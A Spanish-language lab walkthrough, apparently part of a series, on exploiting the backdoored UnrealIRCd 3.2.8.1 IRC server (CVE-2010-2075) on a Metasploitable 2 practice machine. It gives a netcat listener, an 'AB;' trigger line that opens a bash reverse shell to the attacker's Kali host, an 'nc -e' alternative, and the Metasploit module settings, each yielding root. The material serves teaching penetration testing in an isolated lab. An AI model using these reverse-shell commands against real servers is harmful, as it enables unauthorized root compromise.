# UnrealIRCd (puerto 6667) — Metasploitable 2

> Práctica de laboratorio: aplicar únicamente sobre tu propia máquina Metasploitable 2 (`192.168.100.9`), aislada de Internet. Documento de la serie [Reconocimiento y Metasploit](./01_reconocimiento_y_metasploit.md).

**Qué es:** **UnrealIRCd** es un servidor de **chat IRC**. Versión **3.2.8.1**, **puerto 6667**.

**Cómo se explota:** como le pasó a vsftpd, los archivos de instalación de UnrealIRCd 3.2.8.1 fueron **troyanizados** (**CVE-2010-2075**). El servidor ejecuta como comando del sistema cualquier línea que empiece por los caracteres `AB`. Se obtiene **shell de root**.

## Explotación manual (sin Metasploit)

```bash
# 1. Escucha en Kali
nc -lvp 4444

# 2. Dispara la puerta trasera (línea que empieza por "AB;")
echo 'AB; /bin/bash -c "bash -i >& /dev/tcp/192.168.100.8/4444 0>&1"' | nc 192.168.100.9 6667
#   Alternativa: AB; nc 192.168.100.8 4444 -e /bin/sh

# 3. En el nc aparece la shell de root
id
```

## Explotación con Metasploit

```bash
use exploit/unix/irc/unreal_ircd_3281_backdoor
set RHOSTS 192.168.100.9
set LHOST 192.168.100.8
run
# -> shell de root
```
